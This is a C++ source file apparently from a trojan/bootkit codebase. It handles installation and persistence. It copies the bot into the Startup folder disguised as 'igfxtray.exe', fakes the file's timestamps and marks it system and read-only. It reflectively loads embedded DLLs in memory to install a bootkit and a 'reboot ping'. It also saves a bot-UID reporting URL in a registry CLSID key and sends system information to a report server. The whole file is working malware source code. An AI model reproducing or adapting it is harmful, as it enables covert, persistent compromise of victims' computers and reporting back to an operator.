//---------------------------------------------------------------------------
#include <Shlobj.h>

#include "BotEvents.h"
#include "GetApi.h"
//#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
#include "Modules.h"
#include "Loader.h"

#include "inject.h"
#include "unhook.h"
#include "DllLoader.h"
#include "getsec.h"
#include "BotUtils.h"
#include "Memory.h"

#include "strings.h"
#include "DbgRpt.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace BKIDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define BKIDBG BKIDBGTEMPLATES::DBGOutMessage<>

void AddToAutoRun(void *body, DWORD size)
{	
	WCHAR BOT_FILE_NAME[] = {'\\','i','g','f','x','t','r','a','y','.','e','x','e',0};

	WCHAR *BotPath = GetShellFoldersKey( 1 );
	if ( BotPath == NULL )
	{
		return;
	}

	plstrcatW( BotPath, BOT_FILE_NAME );
	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD  written = 0;
	if (f != INVALID_HANDLE_VALUE)
	{
		pWriteFile(f, body, size, &written, NULL);
		pCloseHandle(f);
	}

	if (written == size)
	{
		SetFakeFileDateTimeW( BotPath );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	}

	MemFree( BotPath );
}

void AddRebootPingToAutorun()
{
	BKIDBG("AddRebootPingToAutorun", "started.");

	DWORD size;	
	PVOID body = GetSectionData("REBOOT_PING", &size);
	
	if (body)
	{
		BKIDBG("AddRebootPingToAutorun", "Ping body found. Adding to autorun.");
		AddToAutoRun(body, size);
	}

	BKIDBG("AddRebootPingToAutorun", "Finished.");
}

void AddRebootPingDllToAutorun()
{
	DWORD dll_body_size = 0;
	void* dll_body = NULL;

	BKIDBG("AddRebootPingDllToAutorun", "started.");
	
	dll_body = GetSectionData("REBOOT_PING_DLL", &dll_body_size);
	BKIDBG("AddRebootPingDllToAutorun", "GetSectionData() body=0x%X size=%u.", dll_body,
		dll_body_size);

	if (dll_body == NULL) return;
	if (dll_body_size == 0) return;

	HMEMORYMODULE dll = MemoryLoadLibrary(dll_body);
	BKIDBG("AddRebootPingDllToAutorun", "MemoryLoadLibrary() result=0x%X", dll);

	if (dll == NULL) return;

	typedef BOOL (WINAPI* InstallFunction)(const void* dll_body, DWORD dll_body_size);

	InstallFunction install = NULL;

	install = (InstallFunction)MemoryGetProcAddress(dll, "Install");
	BKIDBG("AddRebootPingDllToAutorun", "MemoryGetProcAddress() result=0x%X", install);

	if (install == NULL) return;

	// 123_d начало вызова Install для установки ping dll
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));

	BOOL install_result = install(dll_body, dll_body_size);
	if (install_result)
	{
		// 124_d вызов Install для установки ping dll вернул TRUE
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
	}

	BKIDBG("AddRebootPingDllToAutorun", "Finished with install_result=%d.", install_result);
}

void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(UrlBuffer, 0, UrlBufferSize);

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	BKIDBG("GetDriverUrl", "Url='%s':%u (buffer_size=%u)", URL, STR::Length(URL),
		UrlBufferSize);

	if (UrlBufferSize < (STR::Length(URL) - 1)) return;

	m_lstrcpy(UrlBuffer, URL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

bool SaveUrlForBootkitDriver()
{
	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
	CHAR   url[500];
	DWORD	 url_length = 0;
	HKEY   key;
	DWORD  opt = 0;

	GetDriverUrl(url, sizeof(url));

	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
	BKIDBG("SaveUrlForBootkitDriver", "RegCreateKeyExW return 0x%X", key_created);
	if (key_created != ERROR_SUCCESS) return false;

	// Сохраняем на всякий пожарный с 0 в конце
	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
		(DWORD)plstrlenA(url));
	BKIDBG("SaveUrlForBootkitDriver", "RegSetValueExW return 0x%X", url_value_set);
	if (url_value_set != ERROR_SUCCESS) return false;

	BKIDBG("SaveUrlForBootkitDriver", "Url key set (url=%s).", url);

	pRegCloseKey(key);
	return true;
}

bool DeployAndInstallBkDll()
{
	ULONG ret = -1;

	BKIDBG("DeployAndInstallBkDll", "doing DebugReportStep1 on start.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());

	BKIDBG("DeployAndInstallBkDll", "doing DebugReportUpdateNtldrCheckSum on start.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());

	BKIDBG("DeployAndInstallBkDll", "doing sending system information.");
	PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());

	// 110_d - запуск DeployAndInstallBkDll
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));

	BKIDBG("DeployAndInstallBkDll", "looking for setup dll...");

	DWORD BkSize;	
	PVOID BkImage = GetSectionData("BkDll",&BkSize);
	
	BKIDBG("DeployAndInstallBkDll", "GetSectionData() result=0x%X.", BkImage);
	
	if (BkImage)
	{
		HMEMORYMODULE hLib = MemoryLoadLibrary(BkImage);
		
		BKIDBG("DeployAndInstallBkDll", "MLoadLibrary() result=0x%X", hLib);
		if (hLib == NULL) return false;
		
		bool uid_saved = SaveUrlForBootkitDriver();
		BKIDBG("DeployAndInstallBkDll", "UID saved for bootkit.(result=%d)", uid_saved);

		BKIDBG("DeployAndInstallBkDll", "Looking for BkInstall function ....");
		ULONG (*BkInstall)();
		if ( BkInstall = (ULONG(*)())MemoryGetProcAddress(hLib,"BkInstall")  )
		{
			// 111_d - запуск установки
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));

			BKIDBG("DeployAndInstallBkDll", "BkInstall function found 0x%X. Calling it.", BkInstall);
			ret = BkInstall();
			BKIDBG("DeployAndInstallBkDll", "BkInstall function result = 0x%X", ret);

			if (ret == ERROR_SUCCESS)
			{
				//112_d установка успешна
				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));

				BKIDBG("DeployAndInstallBkDll", "add pinger to autorun...");
				AddRebootPingToAutorun();
				AddRebootPingDllToAutorun();
			}

			BKIDBG("DeployAndInstallBkDll", "Doing DebugReportStep2");
			PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(ret));
		}
		MemoryFreeLibrary(hLib);

		BKIDBG("DeployAndInstallBkDll", "returning %d.", (ret == ERROR_SUCCESS));
		return (ret == ERROR_SUCCESS);
	}
	BKIDBG("DeployAndInstallBkDll", "returning false.");
	return false;
}
